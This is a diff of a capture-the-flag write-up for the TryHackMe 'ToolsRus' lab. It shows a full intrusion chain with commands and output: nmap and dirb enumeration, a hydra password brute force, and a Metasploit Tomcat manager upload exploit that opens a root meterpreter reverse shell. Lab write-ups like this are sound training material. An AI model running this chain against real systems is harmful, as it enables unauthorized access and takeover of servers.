@@ -10,7 +10,7 @@ This writeup was last updated: 07/01/2023
 > Port Scanning Using Nmap
 1. Started up this room’s machine
 2. `nmap -sC -sV -A {TARGET-IP} > {FILENAME1}.txt` to perform an aggressive network scan to scan for open ports while utilizing default scripts (-sC) and version detection (-sV) to identify services, as well as their versions, and vulnerabilities on the target system, and then redirect the results into a text file
-3. `cat {FILENAME1}.txt` to output the scan results from the previous command onto the terminal
+3. `cat {FILENAME1}.txt` to output the scan results from the previous command onto our terminal
 ```bash
 root@ip-10-10-171-134:~# nmap -sC -sV -A 10.10.199.35 > PortScan.txt
 ```
@@ -56,7 +56,7 @@ Nmap done: 1 IP address (1 host up) scanned in 11.05 seconds
 #
 > Scanning for Hiddent Web Directories Using Dirb
 4. `dirb http://{TARGET IP} -r > {FILENAME2}.txt` to non-recursively scan the target URL for directories using Dirb's default wordlist and then redirecting the results into a text file
-5. `cat {FILENAME2}.txt` to output the scan results from the previous command onto the terminal
+5. `cat {FILENAME2}.txt` to output the scan results from the previous command onto our terminal
 ```bash
 root@ip-10-10-171-134:~# dirb http://10.10.199.35 -r > WebDirectoryScan.txt
 ```
@@ -90,17 +90,17 @@ DOWNLOADED: 4612 - FOUND: 3
 
 #
 >
-6. `firefox "http://{TARGET IP}/guidelines`
+6. `firefox "http://{TARGET IP}/guidelines` to launch Firefox and redirect it to the target's **/guidelines** page, which displayed a message that contained the name of one of the target's staff members
 
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20ToolsRus/Guidelines.png) 
 
-7. `firefox "http://{TARGET IP}/protected"`
+7. `firefox "http://{TARGET IP}/protected"` to launch Firefox and redirect it to the target's **/protected** web directory, which prompted us to login in order to have access to its contents
 
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20ToolsRus/Protected.png)
 
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20ToolsRus/Protected%20(Unauthorized).png)
 
-8. `hydra -l {USER} -P {WORDLIST PATH} http-get://{ATTACK IP}/{PROTECTED DIRECTORY}`
+8. `hydra -l {USER} -P {WORDLIST PATH} http-get://{ATTACK IP}/{PROTECTED DIRECTORY}` to try to guess the password of the user that we discovered in the **/guidelines** page, which ended up working in the end 
 ```bash
 root@ip-10-10-171-134:~# hydra -l bob -P ~/Tools/wordlists/rockyou.txt http-get://10.10.199.35/protected
 Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
@@ -113,14 +113,14 @@ Hydra (http://www.thc.org/thc-hydra) starting at 2023-07-01 23:43:50
 Hydra (http://www.thc.org/thc-hydra) finished at 2023-07-01 23:43:53
 ```
 
-9. `firefox "http://{TARGET IP}/protected` and sign in shows moved to different port
+9. `firefox "http://{TARGET IP}/protected` to relaunch Firefox and redirect it back to the target's **/protected** page and log in using the set of credentials that we now have, but when logged in, we receive a message saying that the page has moved to a different port
 
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20ToolsRus/Log%20Into%20Protected.png)
 
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20ToolsRus/Page%20Moved%20to%20Different%20Port.png)
 
-10. `dirb http://{TARGET IP}:1234 -r > {FILENAME3}`
-11. `cat {FILENAME3}`
+10. `dirb http://{TARGET IP}:1234 -r > {FILENAME3}` to non-recursively scan the target's other web server that's running on a higher port for directories using Dirb's default wordlist and then redirecting the results into a text file
+11. `cat {FILENAME3}` to output the scan results from the previous command onto our terminal
 ```bash
 root@ip-10-10-171-134:~# dirb http://10.10.199.35:1234 -r > WebDirectoryScan2.txt
 ```
@@ -152,7 +152,7 @@ GENERATED WORDS: 4612
 END_TIME: Sun Jul  2 00:26:42 2023
 DOWNLOADED: 4612 - FOUND: 5
 ```
-12. `firefox "http://{TARGET IP}:1234/manager"` and log in
+12. `firefox "http://{TARGET IP}:1234/manager"` to launch Firefox and redirect it to the target's Tomcat **/manager** page using the set of credentials that we previously found
 
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20ToolsRus/Log%20Into%20Protected.png)
 
@@ -186,8 +186,9 @@ root@ip-10-10-171-134:~# nikto -id bob:bubbles -host http://10.10.199.35:1234/ma
 + 1 host(s) tested
 ```
 
-14. `search Apache Tomcat`
-15. `info {EXPLOIT PATH}`inf
+14. `msfconsole`
+15. `search Apache Tomcat`
+16. `info {EXPLOIT PATH}`
 ```bash
 msf6 > search Tomcat
 
@@ -305,15 +306,15 @@ References:
 
 View the full module info with the info -d command.
 ```
-16. `use {EXPLOIT PATH}`
-17. `show options`
-18. `set HttpPassword {USER'S PASSWORD}`
-19. `set HttpUsername {USER'S USERNAME}`
-20. `set RHOSTS {TARGET IP}`
-21. `set RPORT 1234`
-22. `set TARGETURI /manager`
-23. `show options`
-24. `exploit`
+17. `use {EXPLOIT PATH}`
+18. `show options`
+19. `set HttpPassword {USER'S PASSWORD}`
+20. `set HttpUsername {USER'S USERNAME}`
+21. `set RHOSTS {TARGET IP}`
+22. `set RPORT 1234`
+23. `set TARGETURI /manager`
+24. `show options`
+25. `exploit`
 ```bash
 msf6 > use exploit/multi/http/tomcat_mgr_upload 
 [*] No payload configured, defaulting to java/meterpreter/reverse_tcp
@@ -436,9 +437,9 @@ msf6 exploit(multi/http/tomcat_mgr_upload) > exploit
 
 meterpreter > 
 ```
-25. `getuid`
-26. `ls /root`
-27. `cat /root/{FLAG TEXT FILE}`
+26. `getuid`
+27. `ls /root`
+28. `cat /root/{FLAG TEXT FILE}`
 ```bash
 meterpreter > getuid
 Server username: root
